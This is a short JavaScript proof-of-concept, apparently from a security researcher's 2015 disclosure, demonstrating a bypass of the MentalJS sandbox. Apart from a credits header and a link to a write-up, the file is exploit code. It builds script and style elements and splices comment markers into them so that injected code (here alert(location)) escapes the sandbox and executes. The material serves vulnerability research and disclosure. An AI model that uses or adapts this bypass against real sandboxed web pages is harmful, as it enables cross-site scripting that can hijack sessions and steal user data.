/******************************

march-2015

MentalJS DOM Bypass

This is actually 2 bugs in 1, but
i didn't notice until i reported them.

you can find a post talking about
the bypass in here
http://www.thespanner.co.uk/2015/03/06/mentaljs-dom-bypass/

greetings,

Ruben Ventura [tr3w]
@tr3w_
@rub3n.ventura
youtube.com/user/trew00

******************************/

_=document

x =_.createElement('script');
s =_.createElement('style')
s.innerHTML = '*/alert(location)//'

t=_.createElement('b')
t.textContent = '/*'
x.insertBefore(t.firstChild, null);
x.insertBefore(s, null)
_.body.appendChild(x)

x =_.createElement('script');
s =_.createElement('style')
s.innerHTML = _.getElementsByTagName('script')[2].textContent

x.insertBefore(s.firstChild, null)
_.body.appendChild(x)
